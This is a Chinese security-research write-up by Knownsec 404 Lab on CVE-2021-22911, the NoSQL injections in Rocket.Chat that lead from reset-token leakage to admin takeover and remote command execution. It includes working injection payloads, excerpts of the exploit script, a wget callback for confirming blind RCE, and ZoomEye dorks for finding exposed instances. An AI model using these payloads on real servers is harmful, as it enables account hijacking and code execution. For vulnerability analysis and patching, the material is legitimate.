> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QDIjsLxEWN-qk1-pXOpAnA)

![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT09IJjs3wGQbICd50va8zMqfnXZfD5LGdibcuOrtia3P4DpMAVfibZ8J4MsbHt0JW20QL8Wh0SO8zpyA/640?wx_fmt=gif)

**作者：0x4qE@知道创宇 404 实验室  
时间：2021 年 7 月 28 日**

 **0x01 简述** 

Rocket.Chat 是一个开源的完全可定制的通信平台，由 Javascript 开发，适用于具有高标准数据保护的组织。

2021 年 3 月 19 日，该漏洞在 HackerOne 被提出，于 2021 年 4 月 14 日被官方修复。该漏洞主要是因为 Mongodb 的查询语句是类 JSON 形式的，如`{"_id":"1"}`。由于对用户的输入没有进行严格的检查，攻击者可以通过将查询语句从原来的字符串变为恶意的对象，例如`{"_id":{"$ne":1}}`即可查询 _id 值不等于 1 的数据。

### 影响版本

3.12.1<= Rocket.Chat <=3.13.2

### 漏洞影响面

通过 ZoomEye 网络空间搜索引擎，搜索 ZoomEye dork 数据挖掘语法查看漏洞公网资产影响面。

zoomeye dork 关键词：`app:"Rocket.Chat"`

https://www.zoomeye.org/searchResult?q=app%3A%22Rocket.Chat%22

输入`CVE`编号：`CVE-2021-22911`也可以关联出`ZoomEye dork`

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT2wk5hE58ibfagXAVmuMwssicLkNnJuricVHMPaasicgCY636iaEIaTfqW6VrvINnYAcBB6tK90NWU5wxg/640?wx_fmt=png)

漏洞影响面全球视角可视化

https://www.zoomeye.org/globalmap/app%3A%22Rocket.Chat%22%2Fall%2F0/all/0

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT2wk5hE58ibfagXAVmuMwssicgFL0QlzNaIoc4iaI2sYBJMkgcwWMkQ5iaKbhZ6zLibU8r4IbnIsfeYfwA/640?wx_fmt=png)

 **0x02 复现** 

复现环境为 Rocket.Chat 3.12.1。

使用 pocsuite3 编写 PoC，利用 verify 模式验证。

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT2wk5hE58ibfagXAVmuMwssicITCeedWSNmIO0pGwYXZKJJUEydUf6HSTe6v7BhzabQevt904K3ssicA/640?wx_fmt=png)

 **0x03 漏洞分析** 

该漏洞包含了两处不同的注入，漏洞细节可以在这篇文章（https://blog.sonarsource.com/nosql-injections-in-rocket-chat）中找到，同时还可以找到文章作者给出的 exp。第一处在 server/methods/getPasswordPolicy.js，通过 NoSQL 注入来泄露重置密码的 token。  

```
getPasswordPolicy(params) {
        const user = Users.findOne({ 'services.password.reset.token': params.token });
        if (!user && !Meteor.userId()) {
            throw new Meteor.Error('error-invalid-user', 'Invalid user', {
                method: 'getPasswordPolicy',
            });
        }
        return passwordPolicy.getPasswordPolicy();
    }
```

这里的 params 是用户传入的参数，正常来说，params.token 是一串随机字符串，但在这里可以传一个包含正则表达式的查询语句 `{'$regex':'^A'}`，例如下面这个例子意为查找一处 token 是以大写字母 A 为开头的数据。通过这个漏洞就可以逐字符的爆破修改密码所需的 token。

```
Users.findOne({ 
    'services.password.reset.token': {
        '$regex': '^A'
    } 
})
```

第二处漏洞在 app/api/server/v1/users.js，需要登陆后的用户才能访问，通过这处注入攻击者可以获得包括 admin 在内的所有用户的信息。注入点代码如下：

```
API.v1.addRoute('users.list', { authRequired: true }, {
    get() {
        // ...
        const { sort, fields, query } = this.parseJsonQuery();
        const users = Users.find(query, {/*...*/}).fetch();
        return API.v1.success({
            users,
            // ...
        });
    },
});
```

这处注入需要了解的知识点是，mongo 中的 $where 语句，根据文档，查询语句以这种形式展现 `{ $where: <string|JavaScript Code> }`，因此攻击者可以注入 JavaScript 代码，通过将搜索的结果以报错的形式输出。光说可能难以理解，通过一个例子就能很好地说明了。

攻击者可以传入这样的 query：`{"$where":"this.username==='admin' && (()=>{ throw this.secret })()"}`，就会构成下面这样的查询语句，意为查询 username 为 admin 的用户并将他的信息通过报错输出。

```
Users.find(
    {
        "$where":"this.username==='admin' && (()=>{ throw JSON.stringify(this) })()"
    }, 
    {/*...*/}
).fetch();
```

通过这个漏洞，就可以获得 admin 的修改密码的 token 和 2FA 的密钥，即可修改 admin 的密码，达到了提权的目的。Rocket.Chat 还为管理员账户提供了创建 web hooks 的功能，这个功能用到了 Node.js 的 vm 模块，而 vm 模块可以通过简单的原型链操作被逃逸，达到任意命令执行的效果。至此，我们了解到了这一个命令执行漏洞的所有细节，接下来就通过分析漏洞发现者提供的 exp 来讲一下漏洞利用的过程。

 **0x04 漏洞利用** 

这部分内容基于漏洞发现者给出的 exp，并结合我在复现过程中遇到的问题提出改进意见。

```
# Getting Low Priv user
print(f"[+] Resetting {lowprivmail} password")
## Sending Reset Mail
forgotpassword(lowprivmail,target)

## Getting reset token through blind nosql injection
token = resettoken(target)

## Changing Password
changingpassword(target,token)
```

首先通过 getPasswordPolicy() 处的 token 泄露漏洞，修改普通用户的密码。然而需要注意的是，修改密码的 token 长度为 43 个字符，这个爆破的工作量是很大的，且耗时非常长。因此在获取普通用户权限这一步，可以直接通过注册功能完成，而不需要爆破验证的 token。试想若是攻击目标关闭了注册功能，那意味着我们无法获取到已注册用户的信息，也就无计可施了。

```
# Privilege Escalation to admin
## Getting secret for 2fa
secret = twofactor(target,lowprivmail)
```

第二步是获取管理员账号的 2FA 密钥，其中的 twofactor() 利用了第二处漏洞。

```
def twofactor(url,email):
    # Authenticating
    # ...
    print(f"[+] Succesfully authenticated as {email}")

    # Getting 2fa code
    cookies = {'rc_uid': userid,'rc_token': token}
    headers={'X-User-Id': userid,'X-Auth-Token': token}
    payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
    r = requests.get(url+payload,cookies=cookies,headers=headers)
    code = r.text[46:98]
```

在这个函数中直接默认了管理员账号的 username 为 "admin"，但是经过测试，并不是所有可攻击的目标都以 "admin" 作为 username，那么就需要一种方法来获取管理员账号的 username。观察 mongodb 中存储的用户数据：

```
{
    "_id" : "x", 
    ...
    "services" : { 
        "password" : { 
            ...
        }, 
        ...,
        "emails" : [ { 
            "address" : "x@x.com", 
            "verified" : true
        } ], 
        "roles" : [ "admin" ], 
        "name" : "username",
        ...
}
```

每一个用户字段中都有一条`{"roles":[""]}`，通过`{"$where":"this.roles.indexOf('admin')>=0"}`来查询管理员账号的信息，随后便可获取管理员的 username。

第三步是修改管理员账号的密码，以获得 admin 的权限。

```
## Sending Reset mail
print(f"[+] Resetting {adminmail} password")
forgotpassword(adminmail,target)

## Getting admin reset token through nosql injection authenticated
token = admin_token(target,lowprivmail)

## Resetting Password
code = oathtool.generate_otp(secret)
changingadminpassword(target,token,code)
```

其中 forgotpassword() 这一步不可缺少，因为每次通过 reset token 来修改密码以后，后台会自动删除该 token。在本地测试的时候，因为没有 forgotpassword() 这一步，所以每次执行过 changingadminpassword() 以后，都会因为缺少 reset token 导致下一次 PoC 执行失败。通过断点调试找到了问题所在。

在`.meteor/local/build/programs/server/packages/accounts-password.js line 1016`

```
resetPassword: function () {
    // ...
    try {
        // Update the user record by:
        // - Changing the password to the new one
        // - Forgetting about the reset token that was just used
        // - Verifying their email, since they got the password reset via email.
        const affectedRecords = Meteor.users.update({
            'services.password.reset.token': token
        }, {
            $unset: {
                'services.password.reset': 1,
            }
        });
    }
}
```

每一次执行 resetPassword() 以后，都会清空 token。同样在这个文件中，可以找到用于生成 reset.token 的函数 generateResetToken()。在此文件中共有三次出现，其中一次是函数定义，两次是调用，分别于第 898 行和第 938 行被 sendResetPasswordEmail() 和 sendEnrollmentEmail() 调用。

```
Accounts.sendResetPasswordEmail = (userId, email, extraTokenData) => {
  const {/*...*/} = Accounts.generateResetToken(userId, email, 'resetPassword', extraTokenData);
```

sendResetPasswordEmail() 在申请重置密码的时候被调用，sendEnrollmentEmail() 在用户刚注册的时候被调用。因此，想要获得 reset.token 的值，就要先发起一个重置密码的请求，让后台发送一封重置密码的邮件。

最后一步就是执行任意命令了。

```
## Authenticating and triggering rce

while True:
    cmd = input("CMD:> ")
    code = oathtool.generate_otp(secret)
    rce(target,code,cmd)
```

由于命令执行没有回显，因此我的做法是在本地监听一个端口起一个 HTTP 服务器，然后执行 `wget HTTP服务器地址/${random_str}`，如果 HTTP 服务器收到了路由为 `/${random_str}`的请求，则证明该服务存在漏洞。

 **0x05 后记** 

这次复现经过了挺长的时间，主要是由于这个漏洞利用的条件比较苛刻，需要满足各种限制条件，比如需要开放注册功能、管理员账号开启了 2FA、被攻击目标的版本满足要求。不过通过耐心的分析，把复现过程中遇到的问题一一解决，我还是很高兴的。

 **0x06 防护方案** 

1、更新 Rocket.Chat 至官方发布的最新版。

 **0x07 相关链接** 

1、Rocket.Chat

_https://github.com/RocketChat/Rock__et.Chat_

2、pocsuite3

_https://github.com/knownsec/pocsuite3_

3、NoSQL Injections in Rocket.Chat 3.12.1: How A Small Leak Grounds A Rocket

_https://blog.sonarsource.com/nosql-injections-in-rocket-chat_

4、Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)

_https://www.exploit-db.com/exploits/50108_

5、mongo 文档

_https://docs.mongodb.com/manual/reference/operator/query/where/_

![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT0Z79Hq9GCticVica4ufkjk5xiarRicG97E3oEcibNSrgdGSsdicWibkc8ycazhQiaA81j3o0cvzR5x4kRIcQ/640?wx_fmt=gif)

**往 期 热 门**

(点击图片跳转)

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/3k9IT3oQhT3Jmw11rt08W22M7hl7FS59Z46EQHtYnGPicwNNn0csURAndDCxwp61EXe50ia5Nf1iaJ1uZvKWQvRdQ/640?wx_fmt=jpeg)

加密固件之依据老固件进行解密







](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650948028&idx=1&sn=6e06eb405bed8dffa5a66d8cd41ae2a9&chksm=8079038eb70e8a98c881b5afa0cda541a6b0b95b12c67b06b5f4e1b7e9f94cd97bbcfd73d9d7&scene=21#wechat_redirect)

  

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/3k9IT3oQhT2HuekFwFZVWIGM7ibTG65jiaiblpDZHoEvDwjzBqp3ibGFPrBjl4qiaJiaKCLD1uJRxmj5Pia0FnEnicCy2w/640?wx_fmt=jpeg)

D-Link DIR 3040 从信息泄露到 RCE







](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650948003&idx=1&sn=19275bed5cf72dbe81b742e5ac1b2dc4&chksm=80790391b70e8a87bfe977369e51e5ba4d266ce963f44d6cbd2edcc331b3ec119ffc3ced26f3&scene=21#wechat_redirect)

  

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/3k9IT3oQhT3azzeVwiahwN2PtGgibb2ELp5cZHicCLRKWbzJ5FhQpC6awicZpQFTmicibhvkUGojt1wEHEPFHKq6zhog/640?wx_fmt=jpeg)

VPN 原理以及实现







](http://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650947968&idx=1&sn=45e66431cca37622a4441c9207a2305b&chksm=807903b2b70e8aa4e0ce42f7458f9821bf254283e65f7b369970daba93f1b07f94bb12257e92&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/3k9IT3oQhT0Z79Hq9GCticVica4ufkjk5xK8te0JrCrcOiatDWNPRndZzq1N80rlbyxU9bGuTvekqEGu5utyHqicicw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT09IJjs3wGQbICd50va8zMqN2SkNrrQyWIiaCQvodo60ZfrQIhWic0TSeglsSGiboXx1wjbOxwdu5jQw/640?wx_fmt=jpeg)

**觉得不错点个 “在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**